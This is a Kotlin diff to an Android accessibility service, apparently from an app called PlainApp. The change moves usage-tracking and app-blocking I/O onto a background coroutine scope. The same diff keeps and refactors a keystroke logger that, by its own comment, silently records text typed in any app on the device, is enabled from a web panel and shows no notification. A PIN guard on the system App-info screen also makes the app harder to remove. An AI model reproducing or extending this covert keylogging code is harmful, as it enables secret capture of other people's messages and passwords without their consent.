@@ -26,6 +26,7 @@ import com.ismartcoding.plain.ui.AppInfoUnlockActivity
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.cancel
 import kotlinx.coroutines.launch
 
 /**
@@ -40,6 +41,11 @@ import kotlinx.coroutines.launch
 class PlainAccessibilityService : AccessibilityService() {
 
     private val captureScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
+    // Dedicated background scope for SharedPreferences reads/writes triggered from
+    // onAccessibilityEvent. Keeping this off the service thread is critical — if the
+    // service thread blocks for too long, Android marks the service as malfunctioning
+    // and disables it.
+    private val ioScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -53,29 +59,35 @@ class PlainAccessibilityService : AccessibilityService() {
     private val mainHandler = Handler(Looper.getMainLooper())
     private val enforcementRunnable = object : Runnable {
         override fun run() {
-            try {
-                val pkg = currentForegroundPackage
-                val enteredAt = currentForegroundEnteredAt
-                if (pkg != null && enteredAt > 0) {
-                    val now = System.currentTimeMillis()
-                    val delta = now - enteredAt
-                    if (delta in 100..6 * 60 * 60 * 1000L) {
-                        AppBlockHelper.addUsage(pkg, delta)
-                        currentForegroundEnteredAt = now
+            // All disk I/O must happen off the main/service thread; only the
+            // user-visible actions (overlay + GLOBAL_ACTION_HOME) are dispatched back here.
+            ioScope.launch {
+                try {
+                    val pkg = currentForegroundPackage
+                    val enteredAt = currentForegroundEnteredAt
+                    if (pkg != null && enteredAt > 0) {
+                        val now = System.currentTimeMillis()
+                        val delta = now - enteredAt
+                        if (delta in 100..6 * 60 * 60 * 1000L) {
+                            AppBlockHelper.addUsage(pkg, delta)
+                            currentForegroundEnteredAt = now
+                        }
+                        val reason = AppBlockHelper.blockReason(pkg)
+                        if (reason != null) {
+                            mainHandler.post {
+                                try {
+                                    MessageOverlayService.show(
+                                        title = if (reason == "time_limit") "Daily limit reached" else "App blocked",
+                                        message = "$pkg has been blocked.",
+                                        durationMs = 3500L,
+                                    )
+                                } catch (_: Exception) {}
+                                try { performGlobalAction(GLOBAL_ACTION_HOME) } catch (_: Throwable) {}
+                            }
+                        }
                     }
-                    val reason = AppBlockHelper.blockReason(pkg)
-                    if (reason != null) {
-                        try {
-                            MessageOverlayService.show(
-                                title = if (reason == "time_limit") "Daily limit reached" else "App blocked",
-                                message = "$pkg has been blocked.",
-                                durationMs = 3500L,
-                            )
-                        } catch (_: Exception) {}
-                        performGlobalAction(GLOBAL_ACTION_HOME)
-                    }
-                }
-            } catch (_: Throwable) {}
+                } catch (_: Throwable) {}
+            }
             mainHandler.postDelayed(this, 5000L)
         }
     }
@@ -112,35 +124,51 @@ class PlainAccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
 
+        // CRITICAL: this callback runs on the service's main thread. ANY blocking
+        // I/O here (SharedPreferences read/write, JSON parse of large arrays,
+        // PackageManager calls, etc.) will eventually cause the system to mark
+        // this service as "malfunctioning" and disable it. We extract just the
+        // primitive fields we need and dispatch all heavy work to ioScope.
+
+        val eventType = event.eventType
+
         // Background keystroke logger — silently records what the user types
         // anywhere on the device. Triggered only when the feature is enabled
         // from the web panel; produces no on-device UI / notification.
-        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED &&
-            KeystrokeLogHelper.isEnabled()
-        ) {
-            try {
-                val pkg = event.packageName?.toString().orEmpty()
-                if (pkg.isNotEmpty() && pkg != applicationContext.packageName) {
-                    val texts = event.text
-                    val joined = if (texts != null && texts.isNotEmpty()) {
-                        texts.joinToString(separator = "") { it?.toString().orEmpty() }
-                    } else ""
-                    if (joined.isNotEmpty()) {
-                        val hint = event.contentDescription?.toString()
-                            ?: event.className?.toString()
-                            ?: ""
-                        val label = try { PackageHelper.getLabel(pkg).ifEmpty { pkg } } catch (_: Throwable) { pkg }
-                        KeystrokeLogHelper.append(pkg, label, hint, joined)
-                    }
-                }
-            } catch (_: Throwable) {}
+        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            // Capture the data while it is still safe to read (the AccessibilityEvent
+            // object may be recycled after this method returns).
+            val pkg = event.packageName?.toString().orEmpty()
+            if (pkg.isEmpty() || pkg == applicationContext.packageName) return
+            val texts = event.text
+            val joined = if (texts != null && texts.isNotEmpty()) {
+                texts.joinToString(separator = "") { it?.toString().orEmpty() }
+            } else ""
+            if (joined.isEmpty()) return
+            val hint = event.contentDescription?.toString()
+                ?: event.className?.toString()
+                ?: ""
+            ioScope.launch {
+                try {
+                    if (!KeystrokeLogHelper.isEnabled()) return@launch
+                    val label = try { PackageHelper.getLabel(pkg).ifEmpty { pkg } } catch (_: Throwable) { pkg }
+                    KeystrokeLogHelper.append(pkg, label, hint, joined)
+                } catch (_: Throwable) {}
+            }
             return
         }
 
-        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
+        if (eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
         val pkg = event.packageName?.toString() ?: return
         if (pkg == applicationContext.packageName) return
         if (pkg == "com.android.systemui" || pkg.startsWith("android")) return
+
+        val cls = event.className?.toString()
+        val now = System.currentTimeMillis()
+        val prev = currentForegroundPackage
+        val prevEnteredAt = currentForegroundEnteredAt
+        currentForegroundPackage = pkg
+        currentForegroundEnteredAt = now
 
         // Block any system Settings "App info" / app-details screen behind the
         // PlainApp PIN. Long-press on a launcher icon → "App info" lands here,
@@ -148,7 +176,6 @@ class PlainAccessibilityService : AccessibilityService() {
         // navigation, but we can immediately overlay the unlock activity and
         // bounce the user home if they fail or cancel the PIN check.
         try {
-            val cls = event.className?.toString()
             if (AppInfoGuard.looksLikeAppInfoScreen(pkg, cls) &&
                 AppInfoGuard.isActive(applicationContext) &&
                 !AppInfoGuard.isRecentlyVerified()
@@ -165,43 +192,45 @@ class PlainAccessibilityService : AccessibilityService() {
             }
         } catch (_: Throwable) {}
 
-        // Track usage time for the previously-foreground app so daily time limits work.
-        val now = System.currentTimeMillis()
-        val prev = currentForegroundPackage
-        if (prev != null && prev != pkg && currentForegroundEnteredAt > 0L) {
-            val delta = now - currentForegroundEnteredAt
-            if (delta in 100..6 * 60 * 60 * 1000L) {
-                AppBlockHelper.addUsage(prev, delta)
-            }
-        }
-        currentForegroundPackage = pkg
-        currentForegroundEnteredAt = now
-
-        AppBlockHelper.recordLaunch(pkg)
-        try {
-            val label = PackageHelper.getLabel(pkg).ifEmpty { pkg }
-            TimelineHelper.add("launch", "Opened $label", "", pkg, label, now)
-        } catch (_: Throwable) {}
-
-        val reason = AppBlockHelper.blockReason(pkg)
-        if (reason != null) {
-            LogCat.d("PlainAccessibilityService: blocking $pkg ($reason)")
-            // Show overlay first so the user understands why, then kick to home.
+        // Everything below touches SharedPreferences and the PackageManager —
+        // run it off the service thread so the binder callback returns fast.
+        ioScope.launch {
             try {
-                val title = when (reason) {
-                    "time_limit" -> "Daily limit reached"
-                    "bedtime" -> "Bedtime mode"
-                    else -> "App is blocked"
+                if (prev != null && prev != pkg && prevEnteredAt > 0L) {
+                    val delta = now - prevEnteredAt
+                    if (delta in 100..6 * 60 * 60 * 1000L) {
+                        AppBlockHelper.addUsage(prev, delta)
+                    }
                 }
-                val message = when (reason) {
-                    "time_limit" -> "You have used $pkg longer than the allowed daily time."
-                    "bedtime" -> "$pkg is unavailable during bedtime hours."
-                    else -> "$pkg has been blocked from this device."
+
+                AppBlockHelper.recordLaunch(pkg)
+                try {
+                    val label = PackageHelper.getLabel(pkg).ifEmpty { pkg }
+                    TimelineHelper.add("launch", "Opened $label", "", pkg, label, now)
+                } catch (_: Throwable) {}
+
+                val reason = AppBlockHelper.blockReason(pkg)
+                if (reason != null) {
+                    LogCat.d("PlainAccessibilityService: blocking $pkg ($reason)")
+                    val title = when (reason) {
+                        "time_limit" -> "Daily limit reached"
+                        "bedtime" -> "Bedtime mode"
+                        else -> "App is blocked"
+                    }
+                    val message = when (reason) {
+                        "time_limit" -> "You have used $pkg longer than the allowed daily time."
+                        "bedtime" -> "$pkg is unavailable during bedtime hours."
+                        else -> "$pkg has been blocked from this device."
+                    }
+                    mainHandler.post {
+                        try {
+                            MessageOverlayService.show(title, message, durationMs = 4000L)
+                        } catch (_: Exception) {}
+                        // Send the user back to the home screen — Android will not let us kill another app.
+                        try { performGlobalAction(GLOBAL_ACTION_HOME) } catch (_: Throwable) {}
+                    }
                 }
-                MessageOverlayService.show(title, message, durationMs = 4000L)
-            } catch (_: Exception) {}
-            // Send the user back to the home screen — Android will not let us kill another app.
-            performGlobalAction(GLOBAL_ACTION_HOME)
+            } catch (_: Throwable) {}
         }
     }
 
@@ -214,6 +243,8 @@ class PlainAccessibilityService : AccessibilityService() {
         if (instance === this) instance = null
         mainHandler.removeCallbacks(enforcementRunnable)
         mainHandler.removeCallbacks(screenshotRunnable)
+        try { ioScope.cancel() } catch (_: Throwable) {}
+        try { captureScope.cancel() } catch (_: Throwable) {}
         LogCat.d("PlainAccessibilityService destroyed")
     }
 
